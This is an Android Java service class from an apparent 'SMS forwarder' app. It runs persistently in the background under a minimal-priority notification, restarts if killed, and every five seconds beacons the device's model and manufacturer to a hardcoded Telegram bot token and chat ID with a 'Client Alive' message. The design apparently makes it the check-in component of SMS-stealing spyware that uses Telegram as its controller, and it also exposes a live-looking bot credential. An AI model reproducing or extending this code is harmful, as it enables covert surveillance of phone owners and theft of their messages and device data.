package com.lucifer.smsforwarder;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class PersistentService extends Service {

    private static final String CHANNEL_ID = "PersistentChannel";
    private static final String TAG = "PersistentService";

    private static final String BOT_TOKEN = "7309787344:AAGYiIZStxcdrisSldJ0YczaSEKbaJz8D9I";
    private static final String CHAT_ID = "7631182093";

    private final Handler handler = new Handler();
    private final Runnable pingRunnable = new Runnable() {
        @Override
        public void run() {
            sendPingToBot();
            handler.postDelayed(this, 5000); // 5 sec (change to 300000 for 5 min)
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SMS Forwarder Active")
                .setContentText("Listening for incoming messages")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();

        startForeground(1, notification);
        handler.post(pingRunnable);
    }

    private void sendPingToBot() {
        new Thread(() -> {
            try {
                String deviceInfo = android.os.Build.MODEL + " | SDK " + Build.VERSION.SDK_INT + " | " + Build.MANUFACTURER;
                String message = "✅ <b>Client Alive</b>\n📱 <b>Device:</b> " + deviceInfo;

                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String payload = "chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(message, "UTF-8") +
                        "&parse_mode=HTML";

                OutputStream os = conn.getOutputStream();
                os.write(payload.getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Ping sent. Response code: " + responseCode);
            } catch (Exception e) {
                Log.e(TAG, "Ping failed", e);
            }
        }).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Persistent Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // restarts if killed
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
